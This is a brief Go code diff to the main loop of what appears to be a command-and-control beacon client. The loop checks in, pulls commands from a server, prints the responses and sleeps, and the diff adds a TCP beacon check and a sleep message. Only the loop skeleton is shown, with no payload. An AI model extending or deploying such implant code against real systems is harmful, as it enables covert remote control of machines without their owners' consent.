@@ -18,6 +18,7 @@ func main() {
 	ok := packet.FirstBlood()
 	if ok {
 		for {
+			packet.CheckTcpBeacons()
 			resp := packet.PullCommand()
 			fmt.Printf("%x\n", resp.Bytes())
 			fmt.Printf("%d \n", resp.Response().ContentLength)
@@ -174,6 +175,7 @@ func main() {
 					}
 				}
 			}
+			fmt.Printf("Cycle done, sleeping for %d seconds!\n\n\n", (config.WaitTime / time.Millisecond / 1000))
 			time.Sleep(config.WaitTime)
 		}
 	}
